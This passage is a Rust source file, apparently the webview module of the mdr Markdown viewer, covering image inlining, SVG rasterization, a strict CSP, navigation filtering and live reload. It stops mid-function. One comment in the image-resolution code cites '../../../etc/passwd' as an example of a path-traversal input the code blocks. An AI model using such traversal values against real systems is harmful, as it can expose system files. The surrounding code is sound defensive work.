use muda::{Menu, PredefinedMenuItem, Submenu};
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use tao::event::{Event, WindowEvent};
use tao::event_loop::{ControlFlow, EventLoop, EventLoopBuilder};
use tao::window::WindowBuilder;
use wry::WebViewBuilder;

use crate::core::markdown::{parse_markdown, GITHUB_CSS};
use crate::core::sanitize::sanitize_document_html;
use crate::core::toc;
use crate::vlog;

/// Events the page can send back to the native event loop.
enum UserEvent {
    Quit,
    /// Scroll to a heading: `#anchor` links are handled natively instead of
    /// letting the window navigate (#55).
    ScrollToAnchor(String),
    /// Load another local Markdown document in this window (#55).
    OpenDocument(PathBuf),
}

pub fn run(file_path: PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    // Canonicalize the file path first so parent() always gives an absolute directory.
    // Without this, a bare filename like "README.md" gives parent() = "" (empty),
    // which breaks relative image resolution when CWD differs from expected.
    let canonical_file = std::fs::canonicalize(&file_path).unwrap_or_else(|_| {
        // If canonicalize fails, try current_dir + file_path
        std::env::current_dir()
            .map(|cwd| cwd.join(&file_path))
            .unwrap_or_else(|_| file_path.clone())
    });
    let base_dir = canonical_file
        .parent()
        .map(|p| p.to_path_buf())
        .unwrap_or_else(|| std::env::current_dir().unwrap_or_default());
    let markdown_content = std::fs::read_to_string(&file_path)?;
    vlog!("webview: file_path={}", file_path.display());
    vlog!("webview: base_dir={}", base_dir.display());
    vlog!(
        "webview: markdown_content length={} bytes",
        markdown_content.len()
    );
    let html_body = parse_markdown(&markdown_content);
    vlog!("webview: html_body length={} bytes", html_body.len());
    // In verbose mode, dump all <img> tags found in the HTML
    if crate::core::verbose() {
        use std::sync::OnceLock;
        static RE_VERBOSE: OnceLock<regex::Regex> = OnceLock::new();
        let re_verbose = RE_VERBOSE.get_or_init(|| regex::Regex::new(r#"<img\s[^>]*?>"#).unwrap());
        for cap in re_verbose.find_iter(&html_body) {
            let tag = cap.as_str();
            if tag.len() > 200 {
                vlog!("webview: found <img> tag: {}...", &tag[..200]);
            } else {
                vlog!("webview: found <img> tag: {}", tag);
            }
        }
    }
    let html_body = resolve_local_images(&html_body, &base_dir);
    let toc_entries = toc::extract_toc(&markdown_content);
    let full_html = build_html(&html_body, &toc_entries);

    let watcher_rx = crate::core::watcher::watch_file(&file_path)?;

    let (icon_rgba, icon_w, icon_h) = crate::core::icon::load_icon_rgba();

    let event_loop: EventLoop<UserEvent> = EventLoopBuilder::with_user_event().build();
    let quit_proxy = event_loop.create_proxy();
    let nav_proxy = event_loop.create_proxy();

    // The document currently on screen, shared with the navigation handler so
    // relative links keep resolving after another file has been opened.
    let current_doc = Arc::new(Mutex::new(canonical_file.clone()));
    let nav_doc = Arc::clone(&current_doc);

    // Create a native Edit menu so that Cmd+C/Ctrl+C/V/X/A work on all platforms
    let menu = Menu::new();
    // On macOS the first submenu is the application menu; it gives Cmd+Q and
    // Cmd+W their standard behaviour. Elsewhere the quit shortcut travels
    // through IPC instead (see UserEvent::Quit).
    let app_menu = Submenu::new("mdr", true);
    let _ = app_menu.append_items(&[
        &PredefinedMenuItem::close_window(None),
        &PredefinedMenuItem::quit(None),
    ]);
    let _ = menu.append(&app_menu);
    let edit_menu = Submenu::new("Edit", true);
    let _ = edit_menu.append_items(&[
        &PredefinedMenuItem::cut(None),
        &PredefinedMenuItem::copy(None),
        &PredefinedMenuItem::paste(None),
        &PredefinedMenuItem::select_all(None),
    ]);
    let _ = menu.append(&edit_menu);

    let window = WindowBuilder::new()
        .with_title(format!("mdr - {}", file_path.display()))
        .with_inner_size(tao::dpi::LogicalSize::new(1100.0, 900.0))
        .with_window_icon(Some(
            tao::window::Icon::from_rgba(icon_rgba, icon_w, icon_h).unwrap(),
        ))
        .build(&event_loop)?;

    // On macOS, init the menu for the app so Cmd+C/V/X/A work via the responder chain
    #[cfg(target_os = "macos")]
    menu.init_for_nsapp();

    let ipc_handler = move |request: wry::http::Request<String>| {
        if is_quit_request(request.body()) {
            let _ = quit_proxy.send_event(UserEvent::Quit);
        }
    };

    // Nothing but mdr's own document may ever be loaded in this window: a link
    // used to replace the document with no way back (#55), and a hostile
    // document could navigate to an attacker-controlled page (#62).
    let navigation_handler = move |url: String| {
        let doc = nav_doc
            .lock()
            .map(|d| d.clone())
            .unwrap_or_else(|_| PathBuf::new());
        match navigation_decision(&url, &doc) {
            NavDecision::Allow => true,
            NavDecision::Anchor(anchor) => {
                let _ = nav_proxy.send_event(UserEvent::ScrollToAnchor(anchor));
                false
            }
            NavDecision::OpenExternally(target) => {
                open_in_system_browser(&target);
                false
            }
            NavDecision::OpenDocument(path) => {
                let _ = nav_proxy.send_event(UserEvent::OpenDocument(path));
                false
            }
            NavDecision::Block => {
                vlog!("navigation refused: {}", url);
                false
            }
        }
    };

    #[cfg(target_os = "linux")]
    let webview = {
        use tao::platform::unix::WindowExtUnix;
        use wry::WebViewBuilderExtUnix;
        let vbox = window.default_vbox().unwrap();
        WebViewBuilder::new()
            .with_html(&full_html)
            .with_clipboard(true)
            .with_devtools(true)
            .with_ipc_handler(ipc_handler)
            .with_navigation_handler(navigation_handler)
            .build_gtk(vbox)?
    };
    #[cfg(not(target_os = "linux"))]
    let webview = WebViewBuilder::new()
        .with_html(&full_html)
        .with_clipboard(true)
        .with_devtools(true)
        .with_ipc_handler(ipc_handler)
        .with_navigation_handler(navigation_handler)
        .build(&window)?;

    let mut watcher_rx = watcher_rx;
    let mut watched_file = file_path.clone();
    let mut base_dir = base_dir;

    event_loop.run(move |event, _, control_flow| {
        *control_flow = ControlFlow::Wait;

        // Check for file changes
        if watcher_rx.try_recv().is_ok() {
            while watcher_rx.try_recv().is_ok() {}
            if let Ok(content) = std::fs::read_to_string(&watched_file) {
                let _ = webview.evaluate_script(&document_swap_script(&content, &base_dir));
            }
        }

        match event {
            Event::WindowEvent {
                event: WindowEvent::CloseRequested,
                ..
            } => *control_flow = ControlFlow::Exit,
            Event::UserEvent(UserEvent::Quit) => *control_flow = ControlFlow::Exit,
            Event::UserEvent(UserEvent::ScrollToAnchor(anchor)) => {
                let _ = webview.evaluate_script(&scroll_to_anchor_script(&anchor));
            }
            Event::UserEvent(UserEvent::OpenDocument(path)) => {
                // Reuse the live-reload machinery: the page stays the same, only
                // its content and table of contents are replaced.
                let Ok(content) = std::fs::read_to_string(&path) else {
                    vlog!("cannot open linked document: {}", path.display());
                    return;
                };
                let new_base = path
                    .parent()
                    .map(|p| p.to_path_buf())
                    .unwrap_or_else(|| base_dir.clone());
                // Unlike a live reload, opening another document starts at the
                // top of the page.
                let js = format!(
                    "{} window.scrollTo(0, 0);",
                    document_swap_script(&content, &new_base)
                );
                let _ = webview.evaluate_script(&js);

                base_dir = new_base;
                watched_file = path.clone();
                if let Ok(rx) = crate::core::watcher::watch_file(&path) {
                    watcher_rx = rx;
                }
                if let Ok(mut doc) = current_doc.lock() {
                    *doc = path.clone();
                }
                window.set_title(&format!("mdr - {}", path.display()));
            }
            _ => {}
        }
    });
}

/// The script that swaps the document shown by the page, used both by live
/// reload and by following a link to another Markdown file.
fn document_swap_script(markdown: &str, base_dir: &Path) -> String {
    let body = sanitize_document_html(&resolve_local_images(&parse_markdown(markdown), base_dir));
    let toc_html = build_toc_html(&toc::extract_toc(markdown));
    format!(
        "document.querySelector('.content').innerHTML = {}; document.querySelector('.sidebar ul').innerHTML = {}; if (window.hljs) hljs.highlightAll();",
        serde_json::to_string(&body).unwrap_or_default(),
        serde_json::to_string(&toc_html).unwrap_or_default(),
    )
}

/// The script that scrolls to a heading, for `#anchor` links the navigation
/// handler refused to turn into a real navigation.
fn scroll_to_anchor_script(anchor: &str) -> String {
    let id = serde_json::to_string(anchor).unwrap_or_else(|_| "\"\"".to_string());
    format!(
        "(function() {{ var el = document.getElementById({id}); if (el) el.scrollIntoView({{ behavior: 'smooth', block: 'start' }}); }})();"
    )
}

/// Resolve local image paths to inline base64 data URIs.
/// wry's `with_html()` does not allow loading file:// URLs, so we must embed images directly.
/// SVG files are rasterized to PNG first (to avoid executing embedded scripts/links).
/// Handles both `<img src="...">` and `<img alt="..." src="...">` attribute orders.
fn resolve_local_images(html: &str, base_dir: &std::path::Path) -> String {
    use std::sync::OnceLock;
    vlog!("resolve_local_images: base_dir={}", base_dir.display());
    // Match the entire <img ...> tag with src="..." anywhere inside
    static RE: OnceLock<regex::Regex> = OnceLock::new();
    let re = RE.get_or_init(|| regex::Regex::new(r#"<img\s[^>]*?src="([^"]+)"[^>]*?>"#).unwrap());
    static RE_SRC: OnceLock<regex::Regex> = OnceLock::new();
    let re_src = RE_SRC.get_or_init(|| regex::Regex::new(r#"src="[^"]+""#).unwrap());
    re.replace_all(html, |caps: &regex::Captures| {
        let full_tag = &caps[0];
        let src = &caps[1];
        vlog!("  IMG src={:?}", src);
        // Remote images: the CSP only allows `img-src data:`, so they are
        // downloaded and inlined like local ones (#60). When the download
        // fails — offline mode, network error, non-image answer — the URL is
        // left alone and the browser simply shows a broken image.
        if crate::core::net::is_remote_url(src) {
            return match crate::core::net::remote_image_data_uri(&unescape_url_entities(src)) {
                Some(data_uri) => {
                    vlog!("    → remote image inlined ({} bytes)", data_uri.len());
                    re_src
                        .replace(full_tag, format!("src=\"{}\"", data_uri).as_str())
                        .to_string()
                }
                None => {
                    vlog!("    → remote image left as-is");
                    full_tag.to_string()
                }
            };
        }
        // Skip what is already inlined, and file:// URLs mdr does not resolve.
        if src.starts_with("data:") || src.starts_with("file://") {
            vlog!("    → skipped (data/file URL)");
            return full_tag.to_string();
        }
        // URL-decode the src path (comrak may percent-encode spaces etc.)
        let decoded_src = percent_decode(src);
        // Resolve relative path
        let abs_path = base_dir.join(&decoded_src);
        vlog!("    abs_path={}", abs_path.display());
        vlog!("    exists={}", abs_path.exists());
        // Path traversal protection. The allowed root is the enclosing project,
        // not the directory of the Markdown file, so `docs/page.md` can show
        // `../images/logo.png` (#61) while `../../../etc/passwd` stays out.
        if abs_path.exists() && !crate::core::paths::is_within_image_root(&abs_path, base_dir) {
            vlog!(
                "    → BLOCKED (path traversal: {} escapes the project of {})",
                abs_path.display(),
                base_dir.display()
            );
            return full_tag.to_string();
        }
        if abs_path.exists() {
            if let Err(e) = crate::core::image_validation::validate_image_file(&abs_path) {
                vlog!("    → INVALID image: {}", e);
                return format!(
                    "<span style=\"color:red;\">[⚠ Invalid image: {} — {}]</span>",
                    abs_path.file_name().unwrap_or_default().to_string_lossy(),
                    e
                );
            }
            let is_svg = abs_path
                .extension()
                .and_then(|e| e.to_str())
                .map(|e| e.eq_ignore_ascii_case("svg"))
                .unwrap_or(false);
            vlog!("    is_svg={}", is_svg);
            if is_svg {
                match rasterize_svg_to_png_data_uri(&abs_path) {
                    Ok(png_data_uri) => {
                        vlog!("    → SVG rasterized to PNG ({} bytes)", png_data_uri.len());
                        return re_src
                            .replace(full_tag, format!("src=\"{}\"", png_data_uri).as_str())
                            .to_string();
                    }
                    Err(e) => {
                        vlog!("    → SVG rasterization FAILED: {}", e);
                    }
                }
                // Fallback: embed SVG as data URI (scripts won't execute in <img> context)
                match file_to_data_uri(&abs_path) {
                    Ok(data_uri) => {
                        vlog!("    → SVG embedded as data URI ({} bytes)", data_uri.len());
                        return re_src
                            .replace(full_tag, format!("src=\"{}\"", data_uri).as_str())
                            .to_string();
                    }
                    Err(e) => {
                        vlog!("    → SVG file_to_data_uri FAILED: {}", e);
                    }
                }
                vlog!("    → SVG: all attempts failed, keeping original tag");
                return full_tag.to_string();
            }
            // For non-SVG images, use base64 data URI
            match file_to_data_uri(&abs_path) {
                Ok(data_uri) => {
                    vlog!("    → embedded as data URI ({} bytes)", data_uri.len());
                    return re_src
                        .replace(full_tag, format!("src=\"{}\"", data_uri).as_str())
                        .to_string();
                }
                Err(e) => {
                    vlog!("    → file_to_data_uri FAILED: {}", e);
                }
            }
        } else {
            vlog!("    → file NOT FOUND");
        }
        full_tag.to_string()
    })
    .to_string()
}

/// Undo the HTML escaping comrak applies inside attribute values, so the URL
/// handed to the fetcher is the one the author wrote. Only the characters
/// comrak actually escapes are handled: an image URL with a query string
/// (`?a=1&b=2`) reaches the HTML as `&amp;` and would otherwise 404.
fn unescape_url_entities(src: &str) -> String {
    src.replace("&amp;", "&")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
}

/// Decode percent-encoded URL path components (e.g. %20 -> space).
fn percent_decode(s: &str) -> String {
    let mut result = String::with_capacity(s.len());
    let mut chars = s.chars();
    while let Some(c) = chars.next() {
        if c == '%' {
            let hex: String = chars.by_ref().take(2).collect();
            if hex.len() == 2 {
                if let Ok(byte) = u8::from_str_radix(&hex, 16) {
                    result.push(byte as char);
                    continue;
                }
            }
            result.push('%');
            result.push_str(&hex);
        } else {
            result.push(c);
        }
    }
    result
}

/// Convert a local file to a base64 data URI string.
const MAX_IMAGE_FILE_SIZE: u64 = 100 * 1024 * 1024; // 100 MB

fn file_to_data_uri(path: &std::path::Path) -> Result<String, Box<dyn std::error::Error>> {
    use base64::Engine;
    let metadata = std::fs::metadata(path)?;
    if metadata.len() > MAX_IMAGE_FILE_SIZE {
        return Err(format!(
            "image file too large ({} bytes, max {})",
            metadata.len(),
            MAX_IMAGE_FILE_SIZE
        )
        .into());
    }
    let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
    let mime = match ext.to_lowercase().as_str() {
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "gif" => "image/gif",
        "webp" => "image/webp",
        "svg" => "image/svg+xml",
        "bmp" => "image/bmp",
        "ico" => "image/x-icon",
        _ => "application/octet-stream",
    };
    let data = std::fs::read(path)?;
    let b64 = base64::engine::general_purpose::STANDARD.encode(&data);
    Ok(format!("data:{};base64,{}", mime, b64))
}

fn build_toc_html(entries: &[toc::TocEntry]) -> String {
    let mut toc = String::new();
    for entry in entries {
        toc.push_str(&format!(
            "<li class=\"toc-h{}\"><a href=\"#{}\">{}</a></li>",
            entry.level, entry.anchor, entry.text
        ));
    }
    toc
}

/// Mermaid.js embedded at compile time — only injected when the Rust renderer fails.
const MERMAID_JS: &str = include_str!("../../assets/mermaid.min.js");

/// Highlight.js embedded at compile time — only injected when code blocks are present.
const HIGHLIGHT_JS: &str = include_str!("../../assets/highlight.min.js");

/// KDL language definition for highlight.js — registered as 'kdl'.
const HIGHLIGHT_KDL: &str = include_str!("../../assets/kdl.highlight.js");

/// GitHub light/dark syntax highlight themes combined with prefers-color-scheme media queries.
const HIGHLIGHT_CSS: &str = concat!(
    "pre code.hljs{display:block;overflow-x:auto;padding:1em}code.hljs{padding:3px 5px}",
    "@media (prefers-color-scheme:light){",
    ".hljs{color:#24292e;background:#fff}",
    ".hljs-doctag,.hljs-keyword,.hljs-meta .hljs-keyword,.hljs-template-tag,.hljs-template-variable,.hljs-type,.hljs-variable.language_{color:#d73a49}",
    ".hljs-title,.hljs-title.class_,.hljs-title.class_.inherited__,.hljs-title.function_{color:#6f42c1}",
    ".hljs-attr,.hljs-attribute,.hljs-literal,.hljs-meta,.hljs-number,.hljs-operator,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-variable{color:#005cc5}",
    ".hljs-meta .hljs-string,.hljs-regexp,.hljs-string{color:#032f62}",
    ".hljs-built_in,.hljs-symbol{color:#e36209}",
    ".hljs-code,.hljs-comment,.hljs-formula{color:#6a737d}",
    ".hljs-name,.hljs-quote,.hljs-selector-pseudo,.hljs-selector-tag{color:#22863a}",
    ".hljs-subst{color:#24292e}",
    ".hljs-section{color:#005cc5;font-weight:700}",
    ".hljs-bullet{color:#735c0f}",
    ".hljs-emphasis{color:#24292e;font-style:italic}",
    ".hljs-strong{color:#24292e;font-weight:700}",
    ".hljs-addition{color:#22863a;background-color:#f0fff4}",
    ".hljs-deletion{color:#b31d28;background-color:#ffeef0}",
    "}",
    "@media (prefers-color-scheme:dark){",
    ".hljs{color:#c9d1d9;background:#0d1117}",
    ".hljs-doctag,.hljs-keyword,.hljs-meta .hljs-keyword,.hljs-template-tag,.hljs-template-variable,.hljs-type,.hljs-variable.language_{color:#ff7b72}",
    ".hljs-title,.hljs-title.class_,.hljs-title.class_.inherited__,.hljs-title.function_{color:#d2a8ff}",
    ".hljs-attr,.hljs-attribute,.hljs-literal,.hljs-meta,.hljs-number,.hljs-operator,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-variable{color:#79c0ff}",
    ".hljs-meta .hljs-string,.hljs-regexp,.hljs-string{color:#a5d6ff}",
    ".hljs-built_in,.hljs-symbol{color:#ffa657}",
    ".hljs-code,.hljs-comment,.hljs-formula{color:#8b949e}",
    ".hljs-name,.hljs-quote,.hljs-selector-pseudo,.hljs-selector-tag{color:#7ee787}",
    ".hljs-subst{color:#c9d1d9}",
    ".hljs-section{color:#1f6feb;font-weight:700}",
    ".hljs-bullet{color:#f2cc60}",
    ".hljs-emphasis{color:#c9d1d9;font-style:italic}",
    ".hljs-strong{color:#c9d1d9;font-weight:700}",
    ".hljs-addition{color:#aff5b4;background-color:#033a16}",
    ".hljs-deletion{color:#ffdcd7;background-color:#67060c}",
    "}",
    // KDL-specific overrides (higher specificity via .language-kdl, no !important needed)
    // Node names: bold red
    ".language-kdl .hljs-title,.language-kdl .function_{color:#cc0000;font-weight:bold}",
    // Property keys: purple italic (distinct from values)
    ".language-kdl .hljs-attr{color:#6f42c1;font-style:italic}",
    // Attribute values: light blue
    ".language-kdl .hljs-string,.language-kdl .hljs-number,.language-kdl .hljs-literal{color:#0969da}",
    "@media (prefers-color-scheme:dark){",
    ".language-kdl .hljs-title,.language-kdl .function_{color:#f87171}",
    ".language-kdl .hljs-attr{color:#d2a8ff;font-style:italic}",
    ".language-kdl .hljs-string,.language-kdl .hljs-number,.language-kdl .hljs-literal{color:#79c0ff}",
    "}"
);

/// Rasterize an SVG file to PNG and return as a base64 data URI.
/// This is safer than inlining SVG because SVG can contain scripts, links, and styles
/// that would execute in the page context and cause unwanted navigation/requests.
/// Returns Err if the file is not a valid SVG (e.g., an HTML page saved with .svg extension).
fn rasterize_svg_to_png_data_uri(
    path: &std::path::Path,
) -> Result<String, Box<dyn std::error::Error>> {
    use base64::Engine;
    use std::sync::{Arc, OnceLock};

    let svg_data = std::fs::read_to_string(path)?;

    // Reject files that aren't actually SVG (e.g. HTML pages saved with .svg extension)
    let trimmed = svg_data.trim_start();
    if (!trimmed.starts_with('<')
        || trimmed.starts_with("<!DOCTYPE html")
        || trimmed.starts_with("<html"))
        && !trimmed.contains("<svg")
    {
        return Err("File is not a valid SVG (possibly an HTML page)".into());
    }

    // Max pixel dimension to avoid memory issues
    const MAX_DIM: f32 = 8192.0;

    // Reuse font database across calls
    static FONTDB: OnceLock<Arc<usvg::fontdb::Database>> = OnceLock::new();
    let fontdb = FONTDB.get_or_init(|| {
        let mut db = usvg::fontdb::Database::new();
        db.load_system_fonts();
        Arc::new(db)
    });

    let options = usvg::Options {
        fontdb: Arc::clone(fontdb),
        ..Default::default()
    };
    let tree = usvg::Tree::from_str(&svg_data, &options)?;
    let size = tree.size();
    let svg_w = size.width();
    let svg_h = size.height();

    if svg_w <= 0.0 || svg_h <= 0.0 {
        return Err("SVG has zero dimensions".into());
    }

    // Scale 2x for retina, but cap at MAX_DIM
    let ideal_scale = 2.0_f32;
    let max_scale_w = MAX_DIM / svg_w;
    let max_scale_h = MAX_DIM / svg_h;
    let scale = ideal_scale.min(max_scale_w).min(max_scale_h);

    let width = (svg_w * scale) as u32;
    let height = (svg_h * scale) as u32;

    if width == 0 || height == 0 {
        return Err("SVG dimensions too small after scaling".into());
    }

    let mut pixmap = tiny_skia::Pixmap::new(width, height).ok_or("Failed to create pixmap")?;
    let transform = tiny_skia::Transform::from_scale(scale, scale);
    resvg::render(&tree, transform, &mut pixmap.as_mut());

    let png_data = pixmap.encode_png()?;
    let b64 = base64::engine::general_purpose::STANDARD.encode(&png_data);
    Ok(format!("data:image/png;base64,{}", b64))
}

fn build_html(body: &str, toc_entries: &[toc::TocEntry]) -> String {
    // Everything coming from the document is filtered here, before mdr's own
    // template is wrapped around it (#62). mdr's scripts are added afterwards
    // and are never sanitised.
    let body = &sanitize_document_html(body);
    let toc_html = build_toc_html(toc_entries);
    // Only include mermaid.js if there are fallback blocks that need JS rendering
    let mermaid_script = if body.contains(r#"class="mermaid""#) {
        format!(
            r#"<script>{}</script>
<script>mermaid.initialize({{ startOnLoad: true, theme: (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? 'dark' : 'default' }});</script>"#,
            MERMAID_JS
        )
    } else {
        String::new()
    };
    // Only include highlight.js when there are fenced code blocks to highlight
    let highlight_script = if body.contains("<pre><code") {
        format!(
            r#"<style>{css}</style><script>{js}</script><script>{kdl}hljs.registerLanguage('kdl',hljsDefineKdl);hljs.highlightAll();</script>"#,
            css = HIGHLIGHT_CSS,
            js = HIGHLIGHT_JS,
            kdl = HIGHLIGHT_KDL,
        )
    } else {
        String::new()
    };

    // Explicit per-theme rules mirroring the prefers-color-scheme blocks, so
    // Ctrl/Cmd+D can override the system preference.
    let theme_overrides = format!(
        "{}{}",
        theme_override_css(GITHUB_CSS),
        if highlight_script.is_empty() {
            String::new()
        } else {
            theme_override_css(HIGHLIGHT_CSS)
        }
    );

    // The CSP below is a second line of defence behind `sanitize_document_html`:
    // no network access at all (`default-src`/`connect-src 'none'`), no plugin
    // or frame, no form submission, no `<base>` rewriting; images may only be
    // the `data:` URIs mdr inlines itself.
    //
    // `script-src` still needs `'unsafe-inline'`: every script of the page
    // (search, keyboard, highlight.js, Mermaid) is inline, so dropping it would
    // disable mdr itself. Replacing it with a per-page nonce is the real fix and
    // is possible, but it also disables `'unsafe-inline'` for good, and neither
    // Mermaid's nor highlight.js's runtime requirements could be checked in a
    // real WebKit window here — so the document sanitiser stays the guard that
    // keeps document scripts out of the page.
    format!(
        r#"<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src data:; media-src 'none'; object-src 'none'; frame-src 'none'; child-src 'none'; connect-src 'none'; form-action 'none'; base-uri 'none';">
<style>{css}</style>
<style>
.expandable {{ position: relative; }}
.expand-btn {{
    position: absolute; top: 6px; right: 6px;
    width: 28px; height: 28px;
    background: rgba(0,0,0,0.55); border: none; border-radius: 4px;
    cursor: pointer; opacity: 0; transition: opacity 0.15s;
    display: flex; align-items: center; justify-content: center;
    padding: 0; z-index: 10;
}}
.expandable:hover .expand-btn {{ opacity: 1; }}
.expand-btn:hover {{ background: rgba(0,0,0,0.80); }}
#expand-overlay {{
    display: none; position: fixed;
    top: 0; left: 0; width: 100vw; height: 100vh;
    background: rgba(0,0,0,0.85); z-index: 2147483647;
    align-items: center; justify-content: center; cursor: zoom-out;
}}
#expand-content {{ cursor: default; }}
#expand-content img {{ width: 95vw; height: 95vh; object-fit: contain; }}
#expand-content svg {{ width: 95vw; height: 95vh; }}
.expandable img, .expandable svg {{ cursor: zoom-in; }}
.content svg {{ width: 100% !important; height: auto !important; display: block; }}
body.toc-hidden .sidebar {{ display: none; }}
body.toc-hidden .content {{ margin-left: 0; }}
#shortcuts-overlay {{
    display: none; position: fixed;
    top: 0; left: 0; width: 100vw; height: 100vh;
    background: rgba(0,0,0,0.6); z-index: 2147483646;
    align-items: center; justify-content: center;
}}
#shortcuts-panel {{
    background: var(--bg); color: var(--fg);
    border: 1px solid var(--border); border-radius: 8px;
    padding: 20px 24px; max-height: 80vh; overflow-y: auto;
    box-shadow: 0 8px 32px rgba(0,0,0,0.4);
}}
#shortcuts-panel h2 {{ margin: 0 0 12px; font-size: 1.1em; border: none; }}
#shortcuts-panel table {{ border-collapse: collapse; }}
#shortcuts-panel td {{ padding: 3px 16px 3px 0; font-size: 14px; }}
#shortcuts-panel kbd {{
    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
    font-size: 12px; white-space: nowrap;
    background: var(--code-bg); border: 1px solid var(--border);
    border-radius: 4px; padding: 2px 6px;
}}
@media print {{
    .sidebar, #shortcuts-overlay, #searchBar {{ display: none !important; }}
    .content {{ margin-left: 0; max-width: none; }}
}}
</style>
<style>{theme_overrides}</style>
</head>
<body>
<nav class="sidebar">
<p class="sidebar-title">Table of Contents</p>
<ul>{toc}</ul>
</nav>
<div class="content">
{body}
</div>
<script>
document.querySelector('.sidebar').addEventListener('click', function(e) {{
    if (e.target.tagName === 'A') {{
        e.preventDefault();
        var id = e.target.getAttribute('href').substring(1);
        var el = document.getElementById(id);
        if (el) {{
            el.scrollIntoView({{ behavior: 'smooth', block: 'start' }});
            document.querySelectorAll('.sidebar a').forEach(a => a.classList.remove('active'));
            e.target.classList.add('active');
        }}
    }}
}});
</script>
<div class="search-bar" id="searchBar" style="display:none;">
    <input type="text" id="searchInput" placeholder="Search..." />
    <span class="search-info" id="searchInfo">0/0</span>
    <button onclick="searchNav(-1)">&#9650;</button>
    <button onclick="searchNav(1)">&#9660;</button>
    <button class="close-btn" onclick="closeSearch()">Esc</button>
</div>
<script>
(function() {{
    var matches = [];
    var currentIdx = -1;

    function clearHighlights() {{
        document.querySelectorAll('mark.search-highlight').forEach(function(m) {{
            var parent = m.parentNode;
            parent.replaceChild(document.createTextNode(m.textContent), m);
            parent.normalize();
        }});
        matches = [];
        currentIdx = -1;
    }}

    function highlightMatches(query) {{
        clearHighlights();
        if (!query) {{ updateInfo(); return; }}
        var walker = document.createTreeWalker(
            document.querySelector('.content'),
            NodeFilter.SHOW_TEXT, null, false
        );
        var textNodes = [];
        while (walker.nextNode()) textNodes.push(walker.currentNode);

        var queryLower = query.toLowerCase();
        for (var i = textNodes.length - 1; i >= 0; i--) {{
            var node = textNodes[i];
            var text = node.textContent;
            var textLower = text.toLowerCase();
            var idx = textLower.lastIndexOf(queryLower);
            while (idx >= 0) {{
                var range = document.createRange();
                range.setStart(node, idx);
                range.setEnd(node, idx + query.length);
                var mark = document.createElement('mark');
                mark.className = 'search-highlight';
                range.surroundContents(mark);
                node = mark.previousSibling || node.parentNode.firstChild;
                idx = idx > 0 ? node.textContent.toLowerCase().lastIndexOf(queryLower, idx - 1) : -1;
            }}
        }}
        matches = document.querySelectorAll('mark.search-highlight');
        if (matches.length > 0) {{ currentIdx = 0; goToCurrent(); }}
        updateInfo();
    }}

    function goToCurrent() {{
        document.querySelectorAll('mark.search-highlight.current').forEach(function(m) {{ m.classList.remove('current'); }});
        if (matches.length > 0 && currentIdx >= 0) {{
            matches[currentIdx].classList.add('current');
            matches[currentIdx].scrollIntoView({{ behavior: 'smooth', block: 'center' }});
        }}
    }}

    function updateInfo() {{
        var info = document.getElementById('searchInfo');
        if (matches.length === 0) {{ info.textContent = '0/0'; }}
        else {{ info.textContent = (currentIdx + 1) + '/' + matches.length; }}
    }}

    window.searchNav = function(dir) {{
        if (matches.length === 0) return;
        currentIdx = (currentIdx + dir + matches.length) % matches.length;
        goToCurrent();
        updateInfo();
    }};

    window.closeSearch = function() {{
        document.getElementById('searchBar').style.display = 'none';
        clearHighlights();
        updateInfo();
    }};

    // Ctrl/Cmd+F and Escape are handled by the central shortcut dispatcher.
    document.addEventListener('keydown', function(e) {{
        if (e.key === 'Enter' && document.activeElement === document.getElementById('searchInput')) {{
            e.preventDefault();
            if (e.shiftKey) {{ window.searchNav(-1); }}
            else {{ window.searchNav(1); }}
        }}
    }});

    document.getElementById('searchInput').addEventListener('input', function() {{
        highlightMatches(this.value);
    }});
}})();
</script>
{highlight_script}
{mermaid_script}
<div id="expand-overlay"><div id="expand-content"></div></div>
<script>
(function() {{
    var ICON = '<svg width="14" height="14" viewBox="0 0 14 14" fill="white"><path d="M0 0v4h1.5V1.5H4V0H0zm10 0v1.5h2.5V4H14V0h-4zm0 14h4v-4h-1.5v2.5H10V14zM0 10v4h4v-1.5H1.5V10H0z"/></svg>';
    var overlay = document.getElementById('expand-overlay');
    var content = document.getElementById('expand-content');

    function open(el) {{
        content.innerHTML = '';
        content.appendChild(el.cloneNode(true));
        overlay.style.display = 'flex';
    }}

    function wrap(el) {{
        if (el.closest('.expandable') || el.closest('#expand-overlay')) return;
        var w = document.createElement('div');
        w.className = 'expandable';
        el.parentNode.insertBefore(w, el);
        w.appendChild(el);
        var btn = document.createElement('button');
        btn.className = 'expand-btn';
        btn.title = 'View fullscreen';
        btn.innerHTML = ICON;
        w.appendChild(btn);
    }}

    // Delegated listeners — avoids per-element addEventListener issues in WebKitGTK
    document.addEventListener('click', function(e) {{
        var btn = e.target.closest('.expand-btn');
        if (!btn) return;
        e.stopPropagation(); e.preventDefault();
        var el = btn.closest('.expandable').querySelector('img, svg');
        if (el) open(el);
    }});
    document.addEventListener('dblclick', function(e) {{
        var el = e.target.closest('.content img, .content svg');
        if (el) {{ e.stopPropagation(); e.preventDefault(); open(el); }}
    }});

    overlay.addEventListener('click', function() {{ overlay.style.display = 'none'; }});
    content.addEventListener('click', function(e) {{ e.stopPropagation(); }});
    document.addEventListener('keydown', function(e) {{
        if (e.key === 'Escape') overlay.style.display = 'none';
    }});

    new MutationObserver(function(ms) {{
        ms.forEach(function(m) {{
            m.addedNodes.forEach(function(n) {{
                if (!n.tagName) return;
                var t = n.tagName.toUpperCase();
                if (t === 'SVG' || t === 'IMG') wrap(n);
                else if (n.querySelectorAll) n.querySelectorAll('svg,img').forEach(wrap);
            }});
        }});
    }}).observe(document.querySelector('.content'), {{ childList: true, subtree: true }});

    document.readyState === 'loading'
        ? document.addEventListener('DOMContentLoaded', function() {{ document.querySelectorAll('.content img, .content svg').forEach(wrap); }})
        : document.querySelectorAll('.content img, .content svg').forEach(wrap);
}})();
</script>
{shortcuts_help}
<script>{keyboard_script}</script>
</body>
</html>"#,
        css = GITHUB_CSS,
